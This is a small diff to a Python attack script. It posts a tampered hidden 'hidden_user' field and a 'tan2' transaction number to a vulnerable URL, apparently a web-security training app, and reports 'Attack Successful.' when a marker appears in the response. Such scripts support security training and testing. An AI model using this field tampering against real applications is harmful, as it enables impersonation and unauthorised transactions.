@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 import requests
 import re
 import sys
@@ -33,9 +35,7 @@ data = {'hidden_user': 'Jane', 'tan2': 15161, 'Submit': 'Submit'}
 
 x = requests.post(vuln_url, data=data, cookies=cookies)
 
-m = re.search("Jane", x.text)
+m = re.search("74589864", x.text)
 
 if m is not None:
-  exit(0)
-
-exit(1)
+  print("Attack Successful.")
